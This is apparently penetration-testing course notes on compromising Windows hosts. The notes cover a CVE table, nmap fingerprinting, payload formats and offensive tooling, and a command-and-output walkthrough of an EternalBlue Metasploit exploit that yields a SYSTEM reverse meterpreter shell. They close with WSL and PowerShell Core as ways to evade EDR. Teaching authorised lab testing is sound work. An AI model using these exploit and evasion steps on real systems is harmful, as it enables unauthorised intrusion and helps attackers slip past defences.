# Infiltrating Windows

Windows remains the dominant operating system in both home and enterprise environments, and its attack surface continues to expand as features such as Active Directory, cloud service integration, and the Windows Subsystem for Linux introduce new complexity. Over the last five years alone, more than 3,600 vulnerabilities have been reported across Microsoft products, and that number grows continuously. Proficiency with Windows infiltration is therefore a foundational requirement for any penetration tester operating in modern network environments.

<img width="1027" height="631" alt="image" src="https://github.com/user-attachments/assets/7896aaf6-b13b-41d2-8caa-9076513eeafd" />

## Prominent Windows Exploits

Several vulnerabilities in the Windows operating system have had outsized real-world impact and remain relevant to penetration testing engagements against unpatched systems:

| Vulnerability | CVE / Bulletin | Description |
|---|---|---|
| **MS08-067** | MS08-067 | A critical SMB flaw affecting multiple Windows revisions. Exploited by both the Conficker worm and Stuxnet due to its reliability and wide reach. |
| **EternalBlue** | MS17-010 | Leaked from the NSA by the Shadow Brokers. Exploits a flaw in SMBv1 to achieve remote code execution. Used in WannaCry and NotPetya; estimated to have infected over 200,000 hosts in 2017 alone. |
| **PrintNightmare** | CVE-2021-1675 | A remote code execution vulnerability in the Windows Print Spooler service. Valid credentials or a low-privilege shell are sufficient to install a malicious print driver and obtain SYSTEM-level access. |
| **BlueKeep** | CVE-2019-0708 | An RDP protocol vulnerability allowing unauthenticated remote code execution. Affected every Windows revision from Windows 2000 through Server 2008 R2. |
| **Sigred** | CVE-2020-1350 | A DNS SIG record parsing flaw that, when exploited successfully against a domain's DNS server, grants Domain Admin privileges. |
| **SeriousSam** | CVE-2021-36934 | Incorrect permissions on `C:\Windows\system32\config` allow non-elevated users to read the SAM database via Volume Shadow Copy backups, enabling credential extraction. |
| **Zerologon** | CVE-2020-1472 | A cryptographic flaw in the Active Directory Netlogon Remote Protocol (MS-NRPC). An attacker can authenticate as any domain computer account within a matter of seconds using approximately 256 guesses, then reset the account password. |

## Enumerating and Fingerprinting Windows Hosts

Confirming that a target is a Windows host before selecting an exploit module saves time and prevents wasted attempts. Two quick passive and active methods are available before reaching for a full enumeration framework.

### TTL-Based OS Identification

Windows hosts typically return an ICMP TTL value of 128. A response at or close to 128 is a reliable initial indicator, as most hosts will be fewer than 20 hops from the operator's origin point:

```bash
ping 192.168.86.39

PING 192.168.86.39 (192.168.86.39): 56 data bytes
64 bytes from 192.168.86.39: icmp_seq=0 ttl=128 time=102.920 ms
64 bytes from 192.168.86.39: icmp_seq=1 ttl=128 time=9.164 ms
```

Linux hosts typically return a TTL of 64; network devices such as Cisco routers commonly return 255. TTL values can vary when traffic traverses multiple routing hops, so treat this as a starting indicator rather than a definitive confirmation.

### Nmap OS Detection and Banner Grabbing

**[Nmap](https://nmap.org/)** performs OS fingerprinting by analysing TCP/IP stack characteristics and comparing them against a known database of OS signatures. The `-O` flag enables OS detection:

```bash
sudo nmap -v -O 192.168.86.39
```

Key output confirming a Windows host:

```
Running: Microsoft Windows 10
OS CPE: cpe:/o:microsoft:windows_10
OS details: Microsoft Windows 10 1709 - 1909
```

The `banner.nse` script extends enumeration by attempting to retrieve service banners from each open port, which can reveal application names and version strings useful for exploit selection:

```bash
sudo nmap -v 192.168.86.39 --script banner.nse
```

If scans return limited results, add `-A` and `-Pn` to force aggressive detection and skip host discovery. Hosts behind firewalls or with hardened TCP/IP stacks may produce inaccurate fingerprinting results, so always cross-reference more than one method before making a determination.

## Payload Types for Windows

Windows provides several native file types that can serve as payload carriers. Each has distinct operational characteristics and is suited to different delivery and execution contexts:

| File Type | Use Case |
|---|---|
| **[DLL](https://docs.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library)** | Reflective DLL injection or DLL hijacking to elevate privileges or bypass UAC without dropping an obvious executable |
| **[Batch (.bat)](https://commandwindows.com/batch.htm)** | Automated command sequences for port opening, enumeration, or callback initiation via the native `cmd.exe` interpreter |
| **[VBScript (.vbs)](https://www.guru99.com/introduction-to-vbscript.html)** | Phishing payloads; commonly used to trigger macro execution in Office documents or invoke the Windows Script Host engine |
| **[MSI (.msi)](https://docs.microsoft.com/en-us/windows/win32/msi/windows-installer-file-extensions)** | Payload packaged as a Windows Installer database; executed with `msiexec` to deliver an elevated reverse shell |
| **[PowerShell (.ps1)](https://docs.microsoft.com/en-us/powershell/scripting/overview)** | Full-featured scripting against the .NET runtime; ideal for in-memory execution, cmdlet-based post-exploitation, and cloud service interaction |

## Payload Generation and Transfer Resources

| Resource | Purpose |
|---|---|
| **[Metasploit Framework / MSFvenom](https://github.com/rapid7/metasploit-framework)** | OS-agnostic exploit and payload generation; supports all major Windows payload formats |
| **[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)** | Cheat sheets for payload generation, one-liner file transfer, and general attack methodology |
| **[Mythic C2 Framework](https://github.com/its-a-feature/Mythic)** | Alternative command and control framework with custom payload generation capabilities |
| **[Nishang](https://github.com/samratashok/nishang)** | Offensive PowerShell implants and scripts; covers reverse shells, privilege escalation, and persistence |
| **[Darkarmour](https://github.com/bats3c/darkarmour)** | Obfuscated binary generation for use against Windows hosts with active endpoint protection |
| **[Impacket](https://github.com/SecureAuthCorp/impacket)** | Python toolset for direct protocol interaction; supports psexec, SMB client, WMI, and Kerberos operations for payload transfer and execution |

Additional transfer options include SMB shares (including `C$` and `ADMIN$`), HTTP/S servers, FTP, TFTP, and direct upload via WinRM. The available protocols on the target determine which transfer method is viable.

## Example Compromise Walkthrough

### Enumerate the Host

Start with an aggressive Nmap scan to identify open ports, service versions, and OS details:

```bash
nmap -v -A 10.129.201.97
```

Relevant output:

```
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds

OS: Windows Server 2016 Standard 14393
Computer name: SHELLS-WINBLUE
```

The scan confirms Windows Server 2016 Standard with SMB exposed on port 445. The hostname `SHELLS-WINBLUE` and the OS version place this host squarely within the affected range for **EternalBlue** (MS17-010), which targets Windows Vista through Server 2016.

### Validate the Exploit Path

Confirm vulnerability using the Metasploit auxiliary scanner before attempting exploitation:

```bash
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 10.129.201.97
msf6 auxiliary(scanner/smb/smb_ms17_010) > run

[+] 10.129.201.97:445 - Host is likely VULNERABLE to MS17-010! - Windows Server 2016 Standard 14393 x64 (64-bit)
```

### Select the Exploit and Configure

Search for EternalBlue modules and select the `ms17_010_psexec` variant, which uses the EternalRomance, EternalSynergy, and EternalChampion chain and is generally more reliable against Server 2016 targets than the base `ms17_010_eternalblue` module:

```bash
msf6 > use 2
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.129.201.97
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST 10.10.14.12
msf6 exploit(windows/smb/ms17_010_psexec) > set LPORT 4444
```

All `Required: yes` options must be populated before running. Verify with `show options` before executing.

### Execute and Receive the Shell

```bash
msf6 exploit(windows/smb/ms17_010_psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.12:4444
[*] 10.129.201.97:445 - Target OS: Windows Server 2016 Standard 14393
[*] 10.129.201.97:445 - Built a write-what-where primitive...
[+] 10.129.201.97:445 - Overwrite complete... SYSTEM session obtained!
[*] Sending stage (175174 bytes) to 10.129.201.97
[*] Meterpreter session 1 opened (10.10.14.12:4444 -> 10.129.201.97:50215)

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

The exploit produces a SYSTEM-level Meterpreter session directly, without requiring a privilege escalation step. Drop into a native system shell using the `shell` command:

```bash
meterpreter > shell

Process 4844 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]

C:\Windows\system32>
```

The `C:\Windows\system32>` prompt indicates a `cmd.exe` session. A PowerShell session would display `PS C:\Windows\system32>` instead.

## CMD vs. PowerShell

Choosing between `cmd.exe` and PowerShell depends entirely on the task at hand and the operational context:

| Consideration | CMD | PowerShell |
|---|---|---|
| Availability | Present on all Windows versions including XP | Available from Windows 7 onwards |
| Input and output model | Plain text | .NET objects |
| Command history logging | Not recorded during the session | Recorded; visible in `$history` and ScriptBlock logging |
| Execution policy restrictions | Not affected | Can be blocked by policy |
| UAC interaction | Less affected | More commonly impacted |
| Post-exploitation capability | Basic; batch files and net commands | Extensive; cmdlets, .NET access, cloud service interaction, aliases |

Use CMD when operating on older hosts, when stealth and minimal logging are priorities, or when only basic system interaction is required. Use PowerShell when advanced scripting, .NET object manipulation, or cloud-based target interaction is needed.

## WSL and PowerShell Core as Evasion Vectors

The **[Windows Subsystem for Linux](https://docs.microsoft.com/en-us/windows/wsl/)** (WSL) provides a full Linux environment embedded within a Windows host. From an offensive perspective, this creates a significant blind spot: network requests and processes initiated from within a WSL instance are not inspected by the Windows Firewall or Windows Defender. ELF binaries executed inside WSL are largely invisible to Windows-native EDR solutions that focus exclusively on PE executables. Observed malware has used WSL-hosted Python3 and Linux binaries to download and execute payloads on Windows hosts while bypassing endpoint controls.

**[PowerShell Core](https://github.com/PowerShell/PowerShell)** introduces a parallel concern on Linux targets: it brings most standard PowerShell functionality to Linux systems, allowing operators familiar with Windows post-exploitation techniques to apply them in Linux environments. Both WSL and PowerShell Core represent relatively novel attack surfaces with limited detection maturity; defenders have not yet established reliable, consistent monitoring for these vectors across most enterprise environments.
